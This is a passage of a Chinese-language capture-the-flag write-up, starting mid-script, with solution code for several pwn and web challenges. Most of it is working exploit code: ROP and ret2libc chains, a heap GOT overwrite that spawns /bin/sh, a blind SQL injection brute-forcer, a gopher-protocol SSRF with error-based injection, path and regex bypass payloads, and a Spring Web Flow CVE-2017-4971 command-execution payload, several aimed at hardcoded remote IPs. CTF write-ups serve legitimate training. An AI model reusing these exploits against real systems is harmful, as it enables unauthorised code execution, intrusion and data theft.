    payload += b"a" * (0x10c-7)
    payload += b"b" * 4
    payload += p32(p_ebx_r)
    payload += p32(bss_addr)
    payload += p32(puts_plt)
    payload += p32(0x804973F)
    payload += p32(puts_got)
    r.sendlineafter("Input your name:\n",payload)
    libc_base = u32(r.recv(4)) - libc.sym["puts"]
    success(f"libc_base : {hex(libc_base)}")
    open_addr = libc_base + libc.sym["open"]
    read_addr = libc_base + libc.sym["read"]
    write_addr = libc_base + libc.sym["write"]
    # dbg("b *0x804966D")
    # open("./flag")
    payload = b"./flag\x00"
    payload += b"a" * (0x10c-7)
    payload += b"b" * 4
    payload += p32(p_edi_ebp_r)
    payload += p32(bss_addr)
    payload += p32(1)
    payload += p32(open_addr)
    payload += p32(0x804973F)
    payload += p32(bss_addr)
    r.sendlineafter("Input your name:\n",payload)
    # read(3,bss+0x200,0x40)
    payload = b"./flag\x00"
    payload += b"a" * (0x10c-7)
    payload += b"b" * 4
    payload += p32(p_edi_ebp_r)
    payload += p32(bss_addr)
    payload += p32(1)
    payload += p32(read_addr)
    payload += p32(0x804973F)
    payload += p32(3)
    payload += p32(bss_addr+0x200)
    payload += p32(0x40)
    r.sendlineafter("Input your name:\n",payload)
    # write(1,bss+0x200,0x40)
    payload = b"./flag\x00"
    payload += b"a" * (0x10c-7)
    payload += b"b" * 4
    payload += p32(p_edi_ebp_r)
    payload += p32(bss_addr)
    payload += p32(1)
    payload += p32(write_addr)
    payload += p32(0x804973F)
    payload += p32(1)
    payload += p32(bss_addr+0x200)
    payload += p32(0x40)
    r.sendlineafter("Input your name:\n",payload)
    r.interactive()
###  pwn1
    #coding:utf-8
    from pwn import *
    from LibcSearcher import *
    context.log_level = 'debug'
    debug = 0
    if debug == 1:
        r = process('./pwn')
        # gdb.attach(r)
    else:
        r = remote('182.116.62.85',24199)
    def add(name, price, descrip_size, description):
        r.recvuntil('your choice>> ')
        r.send('1\n')
        r.recvuntil('name:')
        r.send(name + '\n')
        r.recvuntil('price:')
        r.send(str(price) + '\n')
        r.recvuntil('descrip_size:')
        r.send(str(descrip_size) + '\n')
        r.recvuntil('description:')
        r.send(str(description) + '\n')
    def dele(name):
        r.recvuntil('your choice>> ')
        r.send('2\n')
        r.recvuntil('name:')
        r.send(name + '\n')
    def lis():
        r.recvuntil('your choice>> ')
        r.send('3\n')
        r.recvuntil('all  commodities info list below:\n')
        return r.recvuntil('\n---------menu---------')[:-len('\n---------menu---------')]
    def changePrice(name, price):
        r.recvuntil('your choice>> ')
        r.send('4\n')
        r.recvuntil('name:')
        r.send(name + '\n')
        r.recvuntil('input the value you want to cut or rise in:')
        r.send(str(price) + '\n')
    def changeDes(name, descrip_size, description):
        r.recvuntil('your choice>> ')
        r.send('5\n')
        r.recvuntil('name:')
        r.send(name + '\n')
        r.recvuntil('descrip_size:')
        r.send(str(descrip_size) + '\n')
        r.recvuntil('description:')
        r.send(description + '\n')
    def exit():
        r.recvuntil('your choice>> ')
        r.send('6\n')
    add('1', 10, 8, 'a')
    add('2', 10, 0x98, 'a')
    add('3', 10, 4, 'a')
    changeDes('2', 0x100, 'a')
    add('4', 10, 4, 'a')
    def leak_one(address):
        changeDes('2', 0x98, '4' + '\x00' * 0xf + p32(2) + p32(0x8) + p32(address))
        res = lis().split('des.')[-1]
        if(res == '\n'):
            return '\x00'
        return res[0]
    def leak(address):
        content =  leak_one(address) + leak_one(address + 1) + leak_one(address + 2) + leak_one(address + 3)
        log.info('%#x => %#x'%(address, u32(content)))
        return content
    #d = DynELF(leak, elf = ELF('./pwn'))
    malloc_addr = u32(leak(0x804b028))
    log.info("malloc_addr = " + hex(malloc_addr))
    obj = LibcSearcher("malloc",malloc_addr)
    libcbase = malloc_addr - obj.dump("malloc")
    system_addr = libcbase + obj.dump("system")
    log.info('system \'s address = %#x'%(system_addr))
    bin_addr = 0x0804B0B8
    changeDes('1', 0x8, '/bin/sh\x00')
    changeDes('2', 0x98, '4' + '\x00' * 0xf + p32(2) + p32(0x8) + p32(0x0804B018))
    changeDes('4', 8, p32(system_addr))
    dele('1')
    r.interactive()
###  easyecho
    from pwn import *
    context.log_level = 'debug'
    p = process("./easyecho")
    p.recvuntil("Name: ")
    p.send('a'*0x10)
    p.recvuntil('a'*0x10)
    leak = u64(p.recvn(6)+b'\x00\x00')
    log.info("leak = " + hex(leak))
    codebase = leak + 0x555555400000 - 0x555555400cf0
    flag = codebase + 0x000000000202040
    p.recvuntil("Input: ")
    p.sendline("backdoor\x00")
    p.recvuntil("Input: ")
    #gdb.attach(p)
    p.sendline(p64(flag)*0x50)
    p.recvuntil("Input: ")
    p.sendline("exitexit\x00")
    p.interactive()
## WEB
###  middle_magic
绕过正则：
    /?aaa=%0apass_the_level_1%23
sha1用数组绕过，还有一个弱比较，用true绕过
最后payload
POST：
    admin[]=1&root_pwd[]=2&level_3={"result":true}
###  easy_sql_2
version:8.0.26-0ubuntu0.20.04.2
    import requests
    url = 'http://182.116.62.85:26571/login.php'
    res = 'flag{spMG94bd95z7h07ZZhCFXQutxY'
    for i in range(32):
        for x in range(33,127):
            if chr(x) not in '\'\\"#$^%':
                """
                data = {
                    "username":'''admin'/**/and/**/(('ctf','{}',3,4,5,6)<(table/**/mysql.innodb_table_stats/**/limit/**/0,1))#'''.format(res+chr(x)),
                    "password":"123"
                }
                """
                data = {
                    "username":'''admin'/**/and/**/(binary('{}')<(table/**/fl11aag/**/limit/**/1,1))#'''.format(res+chr(x)),
                    "password":"123"
                }
                #print(data)
                r = requests.post(url,data=data)
                #print(r.text)
                if "username error!" in r.text:
                    res += chr(x-1)
                    print(res)
                    break
###  easy_sql_1
use.php有个curl
可以用gopher协议访问到index.php
用admin:admin登录成功后，出现cookie，是base64后的username
在cookie处存在注入，可以通过报错拿到flag
    import requests
    import urllib.parse
    import base64
    url = 'http://182.116.62.85:28303/use.php'
    sqlpayload = 'uname=admin&passwd=admin&Submit=1'
    cookie = b'''this_is_your_cookie=admin') and updatexml(1,concat(0x7e,(select substr((select flag from flag),1,40))),1)#'''
    sqlbody1 = '''POST /index.php HTTP/1.1
    Host: 127.0.0.1
    Content-type:application/x-www-form-urlencoded
    Content-Length: {}
    {}
    '''.replace('\n','\r\n').format(len(sqlpayload),sqlpayload)
    sqlbody = '''GET /index.php HTTP/1.1
    Host: 127.0.0.1
    Cookie: PHPSESSID=3qip5l91lc1jtal09u9h40tkp0;this_is_your_cookie={}
    '''.replace('\n','\r\n').format(urllib.parse.quote(str(base64.b64encode(cookie),encoding='utf-8')))
    print(sqlbody)
    gopher_payload = urllib.parse.quote('gopher://127.0.0.1:80/_'+ urllib.parse.quote(sqlbody))
    r = requests.get(url+'?url='+gopher_payload)
    print(r.text)
###  easyP
第一个正则匹配结尾部分，后面加字符绕过，结合basename无法处理非ascii字符，在后面添加%ff
basename就会获取到utils.php
第二个正则url编码绕过
    /index.php/utils.php/%ff?show%5fsource=1
###  Spring
CVE-2017-4971
Spring Web Flow 远程代码执行漏洞复现
Confirm处添加恶意数据即可实现命令执行
如：
    &_(new+java.lang.ProcessBuilder("/bin/bash","/tmp/shell.sh")).start()=feifei